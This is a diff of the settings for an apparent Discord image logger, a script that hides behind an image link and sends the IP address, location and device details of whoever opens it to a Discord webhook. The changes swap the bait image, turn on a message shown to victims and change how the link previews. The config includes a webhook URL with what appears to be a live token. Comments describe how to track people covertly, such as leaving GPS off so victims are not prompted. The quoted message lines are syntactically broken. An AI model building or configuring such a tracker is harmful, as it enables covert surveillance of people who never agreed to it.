@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1344749313112145983/BeTgkPxnfhwUPNTN9pqnUUTYWy_kI81u5J6_PHU-_CWLvCjonqNqqrysZZoBpQvGRexR",
-    "image": "https://tenor.com/view/void-downers-hacker-ddos-incoming-gif-25992109", # You can also have a custom image by using a URL argument
+    "image": "https://www.google.com/imgres?q=image%20de%20ddos&imgurl=https%3A%2F%2Fsurfshark.com%2Fwp-content%2Fuploads%2F2024%2F04%2FHow_to_stop_DDoS_attacks_hero.png&imgrefurl=https%3A%2F%2Fsurfshark.com%2Ffr%2Fblog%2Fattaque-ddos-cest-quoi&docid=gn3omDLKDLlVlM&tbnid=8-zwB7Atito4HM&vet=12ahUKEwiXw6zf0OeMAxU6LPsDHVn0DTYQM3oECGAQAA..i&w=1304&h=638&hcb=2&ved=2ahUKEwiXw6zf0OeMAxU6LPsDHVn0DTYQM3oECGAQAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "Pas mal bête". https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": ":)". https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
